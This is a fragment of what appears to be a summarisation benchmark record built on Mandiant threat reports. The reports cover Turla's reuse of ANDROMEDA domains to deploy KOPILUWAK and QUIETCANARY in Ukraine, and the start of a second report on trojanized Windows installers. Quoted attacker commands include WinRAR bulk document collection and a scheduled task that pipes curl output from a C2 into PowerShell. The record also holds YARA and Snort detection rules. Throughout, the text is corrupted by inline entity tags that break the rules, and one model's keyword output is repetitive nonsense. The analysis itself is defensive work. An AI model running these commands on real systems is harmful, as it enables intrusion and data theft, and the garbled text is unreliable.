drive , a legacy [ORG] ANDROMEDA sample was automatically installed and began to beacon out . ANDROMEDA or [DATE] 2013 Wants Its Malware BackThe version of [ORG] ANDROMEDA that was installed to [PERSON] C:\\Temp\\TrustedInstaller.exe ( MD5 : domains had either expired or been sinkholed by researchers . When executed , the [ORG] ANDROMEDA binary established persistence by dropping another [ORG] ANDROMEDA sample to C:\\ProgramData\\Local Settings\\Temp\\mskmde.com ( MD5 : logged on . [CARDINAL] One of its C2 domains , \u201c suckmycocklameavindustry[.]in , \u201d which had expired , was found to be newly re- registered on [DATE] 2022 - 01 - 19 by a privacy protected registrant using [ORG] Dynadot as the registrar . UNC4210 used this C2 to profile victims before sending the [ORDINAL] first stage [PERSON] KOPILUWAK dropper if the victim was deemed interesting.1/8Mandiant identified several different hosts with beaconing [ORG] ANDROMEDA stager samples . However , we only observed [CARDINAL] one case in which [GPE] Turla - related malware was dropped in additional stages , suggesting a high level of specificity in choosing which victims received a follow - on payload . During the time Mandiant monitored the [ORG] C2s used to deliver the next stage payloads , the servers only remained up for a short period of [DATE] a [DATE] few [DATE] days before going offline for [DATE] several [DATE] weeks at a time . Recon with Ol\u2019 Reliable KOPILUWAKAfter [DATE] several [DATE] months of ANDROMEDA beaconing without any significant activity observed , [ORG] UNC4210 downloaded and executed a [ORG] WinRAR Self - Extracting [ORG] Archive ( WinRAR SFX ) containing [PERSON] KOPILUWAK ( MD5 : appeared to download and run the same WinRAR SFX dropper containing KOPILUWAK [CARDINAL] seven times [DATE] between [DATE] September [DATE] 6 [DATE] and [DATE] September [DATE] 8 . Each time the [ORG] KOPILUWAK cast its net , it attempted to transfer significant amounts of data to [ORG] the [ORG] C2 [ORG] manager.surro[.]am . It is unclear why [PERSON] UNC4210 did this as the profiling commands are hard coded in [GPE] KOPILUWAK and would not yield different sets of data from the same host . [ORG] KOPILUWAK is a [ORG] JavaScript - based reconnaissance utility used to facilitate [CARDINAL] C2 communications and victim profiling . It was [ORDINAL] first reported publicly by [PERSON] Kaspersky and has been tracked by [ORG] Mandiant since [DATE] 2017 . Historically , the utility has been delivered to victims as a [ORDINAL] first - stage malicious email attachment . This is consistent with [ORG] Turla \u2019s historical reuse of tools and malware ecosystems , including [ORG] KOPILUWAK , in cyber operations . The [ORG] ANDROMEDA injected process \u201c wuauclt.exe \u201d made a [ORG] GET request to \u201c yelprope.cloudns[.]cl \" with the target URL \" /system / update / version . \u201d yelprope.cloudns[.]cl is a ClouDNS dynamic [ORG] DNS subdomain which was previously used by [ORG] ANDROMEDA and was re - registered by [ORG] UNC4210 . The ANDROMEDA injected process then downloaded and executed a WinRAR SFX containing KOPILUWAK to C:\\Users\\[username]\\AppData\\Local\\Temp\\0171ef74.exe ( MD5 : Temp . [PERSON] Armageddon operations . Upon execution , the self - extracting archive created and executed [ORG] KOPILUWAK from malware used by this suspected [ORG] Turla [ORG] Team cluster following [ORG] ANDROMEDA . Through [ORG] KOPILUWAK , [ORG] UNC4210 conducted basic network reconnaissance on the victim machine with whoami , netstat , arp , and net , looking for all current [ORG] TCP connections ( with [ORG] PID ) and network shares . The attackers also checked the logical disks and list of current running processes on the machine . Each command result was piped into % TEMP%\\result2.dat , before being uploaded to [ORG] KOPILUWAK 's C2 \" manager.surro[.]am \" via [ORG] POST requests . QUIETCANARY in [DATE] the [DATE] MineTwo [DATE] days after the initial execution of and reconnaissance performed with [ORG] KOPILUWAK , on [DATE] September [DATE] 8 , [DATE] 2022 , [ORG] Mandiant [ORG] detected [ORG] UNC4210 download QUIETCANARY to a host twice , but only executing commands through it on the [ORDINAL] second time . [PERSON] QUIETCANARY is a lightweight .NET backdoor also publicly reported as \u201c Tunnus \u201d which [ORG] UNC4120 used primarily to gather and exfiltrate data from the victim . Please see the QUIETCANARY analysis in the annex for technical details regarding the malware . Following the extensive victim profiling by [ORG] KOPILUWAK , the ANDROMEDA injected process \" wuauclt.exe \" made a GET request to \" yelprope.cloudns[.]cl \" with the target URL \" /system / update / cmu \" , which downloaded and executed staging , and exfiltrating data [TIME] approximately [TIME] 15 [TIME] minutes [TIME] later . Data Theft2/8Mandiant observed interactive commands sent to and executed by [PERSON] QUIETCANARY . In [CARDINAL] one command observed , [ORG] UNC4210 made a typo \u201c netstat -ano -p tcppp \u201d and had to reissue the command suggesting the following data theft was manual process rather than automated collection . UNC4210 attempted to collect documents and data using WinRAR : Data Collection Commandrar a c:\\\\programdata\\\\win_rec.rar \" % appdata%\\\\microsoft\\\\windows\\\\ \" - u -y -r -m2 -inulrar a c:\\\\programdata\\\\win_rec.rar \" [ORG] c:\\\\users\\\\ \" -u -y -r -m2 -inul - c:\\\\programdata\\\\win_files.rar \" c:\\\\users\\\\ \" \" d:\\\\ \" -u -y -r -m2 - inul -n*.pdf -n*.xls * -n*.txt - n*.doc * -hp[redacted ] -v3 M - ta20210101000000 rar a c:\\\\programdata\\\\win_txt.rar \" c:\\\\users \" \" d:\\\\ \" -u -y -r -m2 - inul -n*.txt -hp[redacted ] -v3MPrimary Command Operational Choices Creation of \u201c win_rec.rar \u201d archive containing files recursively found in directories within \u201c % AppData%\\Microsoft\\Windows\\ \u201d , which would have expanded to \u201c C:\\Users\\ [ Username]\\AppData\\Roaming\\Microsoft\\Windows\\ \u201d as [PERSON] QUIETCANARY was executed under the compromised user \u2019s context . Creation of \u201c win_rec.rar \u201d archive containing files with .lnk extension ( namely [ORG] Windows [ORG] LNK shortcuts ) , recursively found in directories within \u201c C:\\Users\\ \u201d Creation of \u201c win_files.rar \u201d password ( redacted ) encrypted archive split in [CARDINAL] 3 MB parts , containing files with extensions .pdf , .xls(x ) , .txt and .doc(x ) , which were modified after [DATE] 2021 - 01 - 01 , recursively found in directories within \u201c C:\\Users\\ \u201d and \u201c D:\\ \u201d Creation of \u201c win_txt.rar \u201d password ( redacted ) encrypted archive split in [CARDINAL] 3 MB parts , containing files with extension .txt , recursively found in directories within \u201c C:\\Users\\ \u201d and \u201c D:\\\u201dNotably , [ORG] UNC4210 appeared to only exfiltrate files created after [DATE] 2021/01/01 . ANDROMEDA C2sAs Mandiant began to review additional ANDROMEDA domains , we observed several more similarly re - registered domains from older malware . [CARDINAL] One domain \u201c anam0rph[.]su \u201d , was re - registered on [DATE] 2022 - 08 - 12 and resolved to the same [ORG] IP as yelprope.cloudns[.]cl during the same period . [ORG] Mandiant assesses with high confidence that \u201c anam0rph[.]su \u201d is also controlled by [ORG] UNC4210 , though we have not observed the domain being used in [PRODUCT] UNC4210 yelprope.cloudns[.]cl suckmycocklameavindustry[.]in [DATE] 2022 - 01 - 19 [DATE] ConclusionSuspected [DATE] Date of Re - Registration IP Resolution [DATE] 212.114.52[.]24 [DATE] 2022 - 08 - 12 Unknown ( [NORP] Dynamic [ORG] DNS ) [DATE] 212.114.52[.]24 [DATE] 35.205.61[.]67As older ANDROMEDA malware continues to spread from compromised [ORG] USB devices , these re - registered domains pose a risk as new threat actors can take control and deliver new malware to victims . This novel technique of claiming expired domains used by widely distributed , financially motivated malware can enable follow - on compromises at a wide array of entities . Further , older malware and infrastructure may be more likely to be overlooked by defenders triaging a wide variety of alerts . This is [ORG] Mandiant \u2019s [ORDINAL] first observation of suspected [GPE] Turla targeting [NORP] Ukrainian entities since the onset of the invasion . The campaign \u2019s operational tactics appear consistent with [ORG] Turla \u2019s considerations for planning and advantageous positioning to achieve initial access into victim systems , as the group has leveraged USBs and conducted extensive victim profiling in the past . In this case , the extensive profiling achieved since [DATE] January possibly allowed the group to select specific victim systems and tailor their follow - on exploitation efforts to gather and exfiltrate information of strategic importance to inform [NORP] Russian priorities . However , we note some elements of this campaign that appear to be a departure from historical [GPE] Turla operations . Both [GPE] KOPILUWAK and [GPE] QUIETCANARY were downloaded in3/8succession at various times , which may suggest the group was operating with haste or less concern for operational security , experiencing some aspect of operational deficiency , or using automated tools . AcknowledgementsWith thanks to [PERSON] Nick [PERSON] Richard and [PERSON] Parnian [PERSON] Najafi for technical review . Special thanks to all [ORG] the [ORG] Mandiant [ORG] Consultants , Mandiant Managed Defense , and [ORG] Pokemon [ORG] Masters supporting [GPE] Ukraine engagements . IndicatorsIndicator UNC4210 ANDROMEDA C2 suckmycocklameavindustry[.]in UNC4210 ANDROMEDA C2 yelprope.cloudns[.]cl UNC4210 ANDROMEDA C2 anam0rph[.]su UNC4210 ANDROMEDA C2 212.114.52[.]24 UNC4210 KOPILUWAK C2 manager.surro[.]am KOPILUWAK194.67.209[.]186:443rule M_APT_Kopiluwak_Recon_1 $ rc4_1 = \" .charCodeAt(i % \" $ rc4_2 = \" .length ) ) % [CARDINAL] 256 \" $ b64_1 = \" [PRODUCT] ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ \" $ b64_3 = \" .charAt(parseInt ( \" $ recon_1 = \" WScript . CreateObject \" $ recon_2 = \" .Run ( \" $ Arguments = \" [WORK_OF_ART] WScript . Arguments \" condition : ( $ rc4_1 and $ rc4_2 and $ b64_1 ) and ( $ Arguments or ( $ b64_3 and $ recon_1 and $ recon_2 ) ) } QUIETCANARYrule M_HUNTING_QUIETCANARY_STRINGS { meta:4/8author=\"Mandiant \" \" c:\\\\Users\\\\Scott\\\\source\\\\repos\\\\Kapushka . Client\\\\BrowserTelemetry\\\\obj\\\\Release\\\\CmService.pdb \" ascii \" c:\\\\Users\\\\Scott\\\\source\\\\repos\\\\Kapushka . Client\\\\BrowserTelemetry\\\\obj\\\\Release\\\\BrowserTelemetry.pdb ascii wide nocase $ pdb3 = \" c:\\\\Users\\\\Scott\\\\source\\\\repos\\\\BrowserTelemetry\\\\BrowserTelemetry\\\\obj\\\\Release\\\\BrowserTelemetry.pdb ascii wide nocase $ orb1 = { [DATE] 68 [DATE] 00 74 00 74 00 70 00 73 00 [CARDINAL] 3A 00 [CARDINAL] 2F 00 2F } $ orb2 = { [DATE] 68 [DATE] 00 74 00 74 00 70 00 [CARDINAL] 3A 00 [CARDINAL] 2F 00 2F } $ command1 = \" get_Command \" ascii wide nocase $ command2 = \" set_Command \" ascii wide nocase $ command3 = \" [ORG] DownloadCommand \" ascii wide nocase $ command4 = \" [ORG] UploadCommand \" ascii wide nocase $ command5 = \" [ORG] AddCommand \" ascii wide nocase $ command6 = \" [ORG] ExeCommand \" ascii wide nocase $ command7 = \" [ORG] KillCommand \" ascii wide nocase $ command8 = \" [ORG] ClearCommand \" ascii wide nocase $ rc4 = { [DATE] 21 [DATE] 00 62 00 76 00 [CARDINAL] 7A 00 65 00 26 00 78 00 61 00 62 00 72 00 39 00 [ORG] 7C 00 38 00 5B 00 3F 00 78 00 77 00 [ORG] 7C 00 [ORG] 7C 00 79 00 26 00 [CARDINAL] 7A 00 6C 00 23 00 74 00 70 00 6B 00 [CARDINAL] 7A 00 6A 00 5E 00 62 00 39 00 61 00 38 00 6A 00 5D 00 40 00 6D 00 39 00 6E 00 28 00 67 00 67 00 24 00 40 00 74 00 74 00 65 00 33 00 33 00 6E 00 28 00 32 00 72 00 [CARDINAL] 7A 00 62 00 [CARDINAL] 7A 00 69 00 74 00 75 00 31 00 2A 00 66 00 61 00 00 80 E9 4D 00 6F 00 [CARDINAL] 7A 00 69 00 6C 00 [CARDINAL] 6C 00 61 ( [CARDINAL] 1 of ( $ pdb * ) ) and ( [CARDINAL] 1 of ( $ orb * ) ) and ( all of ( $ command * ) ) or ( $ rc4 ) ANDROMEDAalert tcp any any - > any any ( msg:\"503 irc_bot_cmd Trojan . Downloader . Andromeda AI callback - trojan block \" ; content:\".php HTTP/1 \" ; nocase ; content:\"|0a| \" ; content:\"|0a| \" ; within:4 ; content:\"POST \" ; content:\"Mozilla/4.0|0d 0a| \" ; content:!\"Referer : \" ; nocase ; [PERSON] content:!\"Cookie : \" ; nocase ; content:!\"Accept - Language : \" ; nocase ; content:!\"Accept - Encoding : \" ; nocase ; content:!\"pharma \" ; nocase ; content:!\"|0d0a|TE : \" ; nocase ; pcre:\"/POST ( http\\:\\/\\/\\S*\\.[a - z0 - 9]{1,4})?/[a - z]{1,3}\\.php HTTP/ \" ; reference : fe_date,2013 - 07 - 11 ; reference : a_type , mal.dsh ; MITRE ATT&CKATT&CK Tactic Category Techniques T1070.004 : File DeletionObfuscated Files or Information Process Injection5/8PersistenceDiscoveryCollectionResource DevelopmentCommand and [PERSON] ControlImpactT1112 : [ORG] Modify [ORG] Registry T1564.003 : Hidden Window T1622 : Debugger EvasionT1547.001 Registry Run Keys / Startup FolderT1010 : T1518 : Application Window Discovery Query Registry System Owner / [ORG] User [ORG] Discovery [ORG] System Network Connections Discovery Process Discovery System Information Discovery File and Directory Discovery Software DiscoveryT1560 : T1560.001 : Archive via UtilityArchive Collected DataT1584 : T1608.003 : [ORG] Install [ORG] Digital [ORG] CertificateCompromise [ORG] InfrastructureT1071.001 : Web Protocols T1573.002 : [PERSON] Asymmetric CryptographyT1529 : [PERSON] System [PERSON] Shutdown / RebootAnnex : [PERSON] QUIETCANARY [PERSON] AnalysisQUIETCANARY is a .NET backdoor that can handle commands from [CARDINAL] C2 . The communications between [GPE] QUIETCANARY and the hard - coded C2 are RC4 encrypted and [PERSON] Base64 encoded over [ORG] HTTPS . QUIETCANARY samples often contain the artifact \u201c [PERSON] Kapushka \u201d in the [ORG] PDB path of the malware . All samples of QUIETCANARY we have identified in the wild have been nearly identical with the only differences being the hardcoded C2 and RC4 key used . Notably as well , each sample of [GPE] QUIETCANARY we found contains but does not use the class ServerInfoExtractor . QUIETCANARY ExecutionUpon execution , QUIETCANARY initializes the hard - coded variables within it for C2 communication , including the RC4 key , user agent , and C2 . It then attempts to connect to the [CARDINAL] C2 via GET request . QUIETCANARY checks to see if the initial response from the C2 is longer than [CARDINAL] 13 characters and begins with the string \" use . \" If so , it takes the substring between the [ORDINAL] third and [ORDINAL] tenth characters from the response and replaces the initial RC4 key with a new key . If this initial connection or exchange of a new RC4 key is not completed , the malware sleeps for [TIME] five [TIME] minutes and tries again . If the malware fails to connect to the C2 again , it quits execution . Otherwise , [PERSON] QUIETCANARY begins a loop that waits for a response from the C2 , and , when it receives [CARDINAL] one , parses and executes the command . QUIETCANARY does not contain a persistence method and thus relies on an external tool or technique to maintain persistence . [PERSON] QUIETCANARY [PERSON] CommandsQUIETCANARY uses a custom parsing routine to decode the command codes and additional parameters from the [CARDINAL] C2 before executing the command [GPE] routines.6/8QUIETCANARY expects the following structure for a command from the C2 : i < i d > s < code val > l < length of parameter > c < parameter > Where:<id > is a decimal command ID , which can be up to [CARDINAL] ten digits < code val > is a [CARDINAL] three - digit command code < length of parameter > is the length of an expected parameter , which can be up to [CARDINAL] six digits < parameter > immediately follows the \" c \" character in the array and is the length specified by < length of parameter > For example , a command from the C2 could look like : i123456789s220l26ccmd.exe echo \" hello world\"When a command is successfully parsed , the command code is queried and returned . QUIETCANARY can parse multiple commands in a single response from the C2 . Upon receiving and successfully parsing a command , [PERSON] QUIETCANARY adds it to a command queue . [PERSON] QUIETCANARY can handle the following command codes from the C2 : Command codesCommand Code Command Name Command Description TimeoutCommand Sets a new time until C2 loop execution times out [ORG] UploadCommand [ORG] DownloadCommand Reads all bytes from a filepath and converts to [PERSON] Base64 encoding KillCommandAborts current command execution thread and starts a new one Execute a command with argumentsUploads a command to a given pathKills execution after a specified delayGiven the different encodings of each command , we detail here how QUIETCANARY processes each command from the C2 before [CARDINAL] execution.0 : ClearCommandAborts current thread of command execution and clears current command in the queue . Starts new command execution thread.220 : ExeCommandChecks to see if parameter starts with the \" character . If so , creates a new string that begins with the \" \\ \" character and consists of each following character in the parameter until it reaches a [ORDINAL] second \" character . If the parameter does not start with the \" character , splits the parameter into substrings by space characters . Arguments directly follow the filename to execute . Then executes the process name with arguments in a hidden window.265 : TimeoutCommandTakes an integer parameter and changes the timeout value in [TIME] seconds for the execution of the C2 loop.420 : UploadCommandTakes a \" | \" delimited parameter and splits into substrings . The [ORDINAL] first substring is the path to which the command should be uploaded . Converts each substring following the [ORDINAL] first from [PERSON] Base64 then writes to the given path on the infected machine.7/8479 : DownloadCommandChecks to see if the file passed to the function within the parameter exists . If it does exist , prepends \" file : \" to the Base64 - encoded bytes of the specified filepath . If it does not , returns \" not found . \" Results of execution are stored in memory and later sent to C2.666 : KillCommandTakes an integer it uses to calculate a time for the malware to sleep . Then kills the process after the sleep . QUIETCANARY separates the commands into [CARDINAL] two categories : fast commands and long commands . Fast commands are executed outside the timeout command structure . The commands will execute once received , and results will immediately be generated after execution . [PERSON] QUIETCANARY interprets [ORG] ClearCommand and [ORG] KillCommand as fast commands . Every other supported command is a long command . Long commands are held to a timeout structure . Once the commands are parsed , they are queued . Access to and execution of the commands is synchronized using the C # Monitor class . It then generates a response string in the following format : i < command id > l < length of result > r < result of command execution > Where the value following the \" r \" character is \" ok \" if the command was successful , and , if the command execution was unsuccessful , the type of command followed by \" error \" ( i.e. , \" kill error , \" \" command error , \" [GPE] etc.).QUIETCANARY appends the response string to the string \" rep \" and sends a [ORG] POST request to the C2 . If the C2s response to the [ORG] POST request is greater than 3 characters long and the [ORDINAL] first [CARDINAL] 3 characters are \" per , \" it returns the string after the [ORDINAL] first [CARDINAL] 3 characters to be parsed . [GPE] QUIETCANARY \u2019s [ORG] Unused [ORG] CodeThe sample of [GPE] QUIETCANARY we analyzed had an unused class called ServerInfoExtractor . The class contains a function that would get some Base64 - encoded value from the following registry key : Key : HKCU\\Software\\Microsoft\\Fax\\VerificationIf the value within the key is \" No , \" the function returns the result \" No . \" Otherwise , it [PERSON] Base64 decodes the contents and returns them . We suspect this registry value may be used to store some configuration in other versions of [GPE] QUIETCANARY . Since no code is present in the [GPE] QUIETCANARY sample that would set this configuration value , we assume this would be set by some method outside the malware . [ORG] QUIETCANARY [ORG] Network [ORG] CommunicationsAll network communications between [GPE] QUIETCANARY and the C2 are RC4 - encrypted and then [ORG] Base-64 encoded . [PERSON] QUIETCANARY is proxy - aware and uses the System . Net . HttpWebRequest class to get any default proxy specified on the victim computer . The malware also dynamically generates a random [ORG] PHP session ID to use when sending a GET request to the C2 , which is added to the [NORP] Cookie field in the request header.8/8", "generated_text": "Mandiant; a suspected Turla Team operation; UNC4210; the KOPILUWAK reconnaissance utility; QUIETCANARY backdoor; andROMEDA malware victims; Ukraine; November 2021; a USB; The USB; the C2; victims; a legacy; a legacy; JSON; data; the KOPILUWAK; a backdoor; persistence; a second stage payload; QUIETCANARY; the payload; the C2; C2s; first; the second stage; the first stage payload; HOST; a second stage; Windows; the second stage; the third stage; the second stage; a payload; the first stage; analysis; the second stage; the payload; the second stage; the fourth stage; the second stage; the third stage; the payload; the third stage; the fourth stage; the second stage; the third stage.", "ref_text": "<START-1>Here is a summary of the key points from the Mandiant report on the Turla hacking group's operations in Ukraine: The cybersecurity firm Mandiant discovered in September 2022 that the Russia-linked hacking group Turla was distributing malware to victims in Ukraine by hijacking the infrastructure of an older commodity malware called Andromeda. Andromeda is a widespread malware that spreads via infected USB drives. Turla re-registered several expired Andromeda command and control domains to profile victims and selectively deploy additional payloads. After months of monitoring, Turla used one of the hijacked domains to deploy a reconnaissance tool called Kopiluwak on a compromised Ukrainian system. Kopiluwak profiled the system's network connections, processes, disks, etc. Two days later, Turla deployed a lightweight backdoor called Quietcanary on the same system. Quietcanary was used to collect and exfiltrate documents and data from the victim's machine. Turla appeared to only exfiltrate files created after a certain date, suggesting they were focused on gathering recent strategic information. While Turla has used tools like Kopiluwak before, this campaign shows their effort to gain access in Ukraine since the invasion by hijacking old malware infrastructure. However, some sloppy practices like redeploying Kopiluwak multiple times suggest potential deficiencies in Turla's current operations. Overall, the report highlights how advanced hacking groups like Turla are opportunistically compromising victims in Ukraine by creatively reusing old malware toolsets. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.45595854922279794, "gpt3/lexical/rouge_rouge2": 0.09895833333333333, "gpt3/lexical/rouge_rougeL": 0.21761658031088082, "gpt3/lexical/rouge_rougeLsum": 0.21761658031088082, "gpt3_generated_text": ["In September 2022, Mandiant uncovered a suspected Turla Team operation, UNC4210, distributing the KOPILUWAK reconnaissance utility and QUIETCANARY backdoor to ANDROMEDA malware victims in Ukraine. The operation involved re-registering expired ANDROMEDA command and control (C2) domains and selectively deploying the malware to victims in Ukraine. The attack began with a USB infected with older malware being inserted at a Ukrainian organization in December 2021, which led to the installation of the ANDROMEDA malware. After several months of beaconing, UNC4210 downloaded and executed a WinRAR Self-Extracting Archive containing KOPILUWAK, a JavaScript-based reconnaissance utility used for C2 communications and victim profiling. UNC4210 showed a high level of specificity in choosing which victims received a follow-on payload, and the servers used to deliver the payloads remained up for only short periods of time. This incident highlights the ongoing threat of Turla-related cyber operations and the reuse of tools and malware ecosystems in these attacks."]}, {"split_name": "test", "sample_id": "test_95", "prompt_text": "Extract the keywords: www.mandiant.com /resources / blog / trojanized - windows - installers - ukrainian - government [ORG] Trojanized Windows 10 Operating System Installers Targeted Ukrainian GovernmentExecutive SummaryMandiant identified an operation focused on the [NORP] Ukrainian government via trojanized [ORG] Windows [ORG] 10 [ORG] Operating [ORG] System installers . These were distributed via torrent sites in a supply chain attack . Threat activity tracked as [ORG] UNC4166 likely trojanized and distributed malicious Windows Operating system installers which drop malware that conducts reconnaissance and deploys additional capability on some victims to conduct data theft . The trojanized files use the [GPE] Ukrainian language pack and are designed to target [NORP] Ukrainian users . Following compromise targets selected for follow on activity included multiple [NORP] Ukrainian government organizations . At this time , [ORG] Mandiant does not have enough information to attribute [ORG] UNC4166 to a sponsor or previously tracked group . However , [ORG] UNC4166 \u2019s targets overlap with organizations targeted by [ORG] GRU related clusters with wipers at the outset of the war . Threat DetailMandiant uncovered a socially engineered supply chain operation focused on [NORP] Ukrainian government entities that leveraged trojanized [ORG] ISO files masquerading as legitimate Windows 10 Operating System installers . The trojanized ISOs were hosted on Ukrainian- and [LANGUAGE] Russian - language torrent file sharing sites . Upon installation of the compromised software , the malware gathers information on the compromised system and exfiltrates it . At a subset of victims , additional tools are deployed to enable further intelligence gathering . In some instances , we discovered additional payloads that were likely deployed following initial uses [LOC] the [LOC] Ukrainian [LOC] Language pack and could be downloaded from \u201c url#1873175 . \u201d The Toloka site is focused on a [NORP] Ukrainian audience and the image uses the [GPE] Ukrainian language ( Figure [CARDINAL] 1 ) . The same [ORG] ISO was observed being hosted on a [NORP] Russian torrent tracker ( url using the same image . The [ORG] ISO contained malicious scheduled tasks that were altered and identified on multiple systems at [CARDINAL] three different [NORP] Ukrainian organizations beaconing to .onion TOR domains beginning around mid - [DATE] July to target [NORP] Ukrainian entities , due to the language pack used and the website used to distribute it . The use of trojanized ISOs is novel in espionage operations and included anti - detection capabilities indicates that the actors behind this activity are security conscious and patient , as the operation would have required a significant time and resources to develop and wait for the [ORG] ISO to be installed on a network of interest . [ORG] Mandiant has not uncovered links to previously tracked activity , but believes the actor behind this operation has a mandate to steal information from the [NORP] Ukrainian government . The organizations where [ORG] UNC4166 conducted follow on interactions included organizations that were historically victims of disruptive wiper attacks that we associate with [GPE] APT28 since the outbreak of the invasion . This [ORG] ISO was originally hosted on a [NORP] Ukrainian torrent tracker called toloka.to by an account \u201c [ORG] Isomaker \u201d which was created on [DATE] the [DATE] May 11 , [DATE] 2022 . The [ORG] ISO was configured to disable the typical security telemetry a [PRODUCT] Windows computer would send to [ORG] Microsoft and block automatic updates and license verification . There was no indication of a financial motivation for the intrusions , either through the theft of monetizable information or the deployment of ransomware or cryptominers . Outlook and [ORG] ImplicationsSupply chain operations can be leveraged for broad access , as in the case of [ORG] NotPetya , or the ability to discreetly select high value targets of interest , as in the [ORG] SolarWinds incident . These operations represent a clear opportunity for operators to get to hard targets and carry out major disruptive attack which may not be contained to conflict [CARDINAL] zone.2/14For more research from Google Cloud on securing the supply chain , see this Perspectives on Security report . Technical [ORG] AnnexMandiant identified several devices within [ORG] Ukrainian [ORG] Government networks which contained malicious scheduled tasks that communicated to a [ORG] TOR website from [DATE] around [DATE] July 12th , [DATE] 2022 . These scheduled tasks act as a lightweight backdoor that retrieves tasking via HTTP requests to a given command and control ( C2 ) server . The responses are then executed via [ORG] PowerShell . From data collated by [ORG] Mandiant , it appears that victims are selected by the threat actor for further tasking . In some instances , we discovered devices had additional payloads that we assess were deployed following initial reconnaissance of the users including the deployment of the [ORG] STOWAWAY and [PERSON] BEACON backdoors . [ORG] STOWAWAY is a publicly available backdoor and proxy . The project supports several types of communication like [ORG] SSH , socks5 . Backdoor component supports upload and download of files , remote shell and basic information gathering . BEACON is a backdoor written in C / C++ that is part of the Cobalt Strike framework . Supported backdoor commands include shell command execution , file transfer , file execution , and file management . BEACON can also capture keystrokes and screenshots as well as act as a proxy server . BEACON may also be tasked with harvesting system credentials , port scanning , and enumerating systems on a network . BEACON communicates with a [CARDINAL] C2 server via HTTP or DNS.The threat actor also began to deploy secondary toehold backdoors in the environment including [ORG] SPAREPART , likely as a means of redundancy for the initial [ORG] PowerShell bootstraps . [ORG] SPAREPART is a lightweight backdoor written in C that uses the device \u2019s [ORG] UUID as a unique identifier for communications with the C2 . Upon successful connection to a [CARDINAL] C2 , [ORG] SPAREPART will download the tasking and execute it through a newly created process . Details Infection VectorMandiant identified multiple installations of a trojanized [ORG] ISO , which masquerades as a legitimate Windows [CARDINAL] 10 installer using [LOC] the [LOC] Ukrainian [LOC] Language pack with telemetry settings disabled . We assess that the threat actor distributed these installers publicly , and then used an embedded schedule task to determine whether Downloaded from url#1873175Forensic analysis on the [ORG] ISO identified the changes made by [ORG] UNC4166 that enables the threat actor to perform additional triage of victim accounts:3/14Modification of the [ORG] GatherNetworkInfo and [ORG] Consolidator Schedule [PERSON] TasksThe [ORG] ISO contained altered [ORG] GatherNetworkInfo and [PERSON] Consolidator schedule tasks , which added a secondary action that executed the [ORG] PowerShell downloader action . Both scheduled tasks are legitimate components of Windows and execute the gatherNetworkInfo.vbs script or waqmcons.exe process . Figure [CARDINAL] 2 : Legitimate GatherNetworkInfo task configurationThe altered tasks both contained a secondary action that was responsible for executing a [ORG] PowerShell command . This command makes use of the curl binary to download a command from the [CARDINAL] C2 server , then the command is executed through [ORG] PowerShell . The [CARDINAL] C2 servers in both instances were addresses to [ORG] TOR gateways . These gateways advertise as a mechanism for users to access [ORG] TOR from the standard internet ( onion.moe , onion.ws).These tasks act as the foothold access into compromised networks , allowing [ORG] UNC4166 to conduct reconnaissance on the victim device to determine networks of value for follow on threat activity . Figure [CARDINAL] 3 : Trojanized GatherNetworkInfo task configurationBased on forensic analysis of the [ORG] ISO file , [ORG] Mandiant identified that the compromised tasks were both edited as follows : C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Customer Experience Improvement url -H ( ' h:'+ ( wmic csproduct get [PERSON] UUID)))C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\NetTrace\\GatherNetworkInfo ( MD5 : Executes : powershell.exe curl.exe -k url -H ( ' h:'+ ( wmic csproduct get UUID ) ) | powershell.exeNote : At the time of analysis , the onion[.]ws C2 server is redirecting requests to legitimate websites . Software Piracy [ORG] ScriptThe [ORG] ISO contained an additional file not found in standard Windows distributions called [NORP] SetupComplete.cmd . [ORG] SetupComplete is a Windows batch script that is configured to be executed upon completion of the Windows installation but before the end user is able to use the device . The script appears to be an amalgamation of multiple public scripts including remove_MS_telemetry.cmd by [ORG] DeltoidDelta and activate.cmd by [PERSON] Poudyalanil ( originally wiredroid ) with the addition of a command to disable OneDriveSetup which was not identified in either script . The script is responsible for disabling several legitimate Windows services and tasks , disabling Windows updates , blocking [ORG] IP addresses and domains related to legitimate [ORG] Microsoft services , disabling [ORG] OneDrive and activating the [PRODUCT] Windows license . Forensic artifacts led [ORG] Mandiant to identify [CARDINAL] three additional scripts that were historically on the image , we assess that over time the threat actor has made alterations to these files.SetupComplete.cmd ( MD5 : [CARDINAL] 84B54D2D022D3DF9340708B992BF6669 ) [PERSON] Batch script to disable legitimate services and activate [PERSON] Windows [PERSON] File currently hosted on ISOSetupComplete.cmd ( MD5 : 67C4B2C45D4C5FD71F6B86FA0C71BDD3)Batch script to disable legitimate services and activate [PRODUCT] Windows [PRODUCT] File recovered through forensic file carvingSetupComplete.cmd ( MD5 : 5AF96E2E31A021C3311DFDA200184A3B)Batch script to disable legitimate services and activate [PRODUCT] Windows [PRODUCT] File recovered through forensic file carvingVictim [ORG] IdentificationMandiant assesses that the threat actor performs initial triage of compromised devices , likely to determine whether the victims were of interest . This triage takes place using the trojanized schedule tasks . In some cases , the threat actor may deploy additional capability for data theft or new persistence backdoors , likely for redundancy in the cases of [ORG] SPAREPART or to enable additional tradecraft with [PERSON] BEACON and STOWAWAY.5/14The threat actor likely uses the device \u2019s [ORG] UUID as a unique identifier to track victims . This unique identifier is transferred as a header in all HTTP requests both to download tasking and upload stolen data / responses . The threat actor \u2019s playbook appears to follow a distinct pattern : Execute a command [NORP] Optionally , filter or expand the results Export the results to [ORG] CSV using [ORG] the Export - Csv command and write to the path sysinfo ( % system32%\\sysinfo ) Optionally , compress the data into [ORG] sysinfo.zip ( % system32%\\sysinfo.zip ) Optionally , upload the data instantaneously to the C2 ( in most cases this is a separate task that is executed at the next beacon).Mandiant identified the threat actor exfiltrate data containing system information data , directory listings including timestamps and device geo - location . A list of commands used can be found in the indicators section . Interestingly , we did uncover a command that did n\u2019t fit the aforementioned pattern in [CARDINAL] at [CARDINAL] least [CARDINAL] one instance . This command was executed on [CARDINAL] at [CARDINAL] least [CARDINAL] one device where the threat actor had access for several weeks.curl.exe -k url -H h : filefile - file - file - file - filefilefile \u2013 output temp.zipAlthough we were not able to discover evidence that temp.zip was executed or recover the file , we were able to identify the content of the file directly from the C2 during analysis . This command is likely an alternative mechanism for the threat actor to collect the system information for the current victim , although it \u2019s unclear why they would n\u2019t deploy the command directly chcp 